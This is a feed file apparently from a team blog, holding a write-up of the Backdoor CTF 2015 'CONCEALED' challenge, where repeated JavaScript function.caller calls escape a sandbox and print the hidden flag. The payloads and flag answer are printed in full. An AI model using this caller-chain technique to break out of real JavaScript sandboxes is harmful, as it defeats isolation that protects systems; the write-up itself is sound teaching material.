@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Javascript | GeeksSpeak Team Blog]]></title>
+  <link href="http://geeksspeak.github.io/blog/categories/javascript/atom.xml" rel="self"/>
+  <link href="http://geeksspeak.github.io/"/>
+  <updated>2015-04-03T02:34:21+04:30</updated>
+  <id>http://geeksspeak.github.io/</id>
+  <author>
+    <name><![CDATA[GeeksSpeak]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
+    <updated>2015-04-03T02:33:31+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
+    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
+<strong>Point = 100</strong><br/>
+<strong>Category = Exploit</strong></p>
+
+<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>
+
+<pre><code>$ nc hack.bckdr.in 8005
+######################################
+####           CONCEAL            ####
+######################################
+
+Welcome to CONCEAL
+You have access to object named sandboxed and its functions 
+Rest everything is sandboxed, don't be a jerk and break something
+Wrap your code in a function and return what you want as output
+Flag is hidden somewhere in the code. 
+Get the flag :D!
+
+home@jail:$ 
+</code></pre>
+
+<p>First of all as banner says we should use all our payload as a function like :</p>
+
+<!--more-->
+
+
+<pre><code>home@jail:$ function exploit() { return "GeeksSpeak"; }
+GeeksSpeak
+home@jail:$ 
+</code></pre>
+
+<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>
+
+<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>
+
+<pre><code>home@jail:$ function exploit() { return exploit.caller.toString(); }
+function () {return (function exploit() { return exploit.caller.toString(); })()}
+home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
+function () {
+        if (!(this instanceof Script)) {
+          throw new TypeError('invalid call to ' + f);
+        }
+        return ns[f].apply(ns, arguments);
+      }
+home@jail:$ 
+</code></pre>
+
+<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>
+
+<pre><code>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
+function (err, line) {
+
+    // flag : 50_y0u_f1n4lly_f0und_17
+
+    if (err &amp;&amp; wait === false) {
+      return callback(err);
+    }
+
+    var against = {},
+        numericInput,
+        isValid;
+
+    if (line !== '') {
+      if (schema.properties[propName]) 
+      [..stripped..]
+</code></pre>
+
+<p>and sha256 of the <code>50_y0u_f1n4lly_f0und_17</code> gives us another 150pts.</p>
+
+<p>HAMIDx9</p>
+]]></content>
+  </entry>
+  
+</feed>
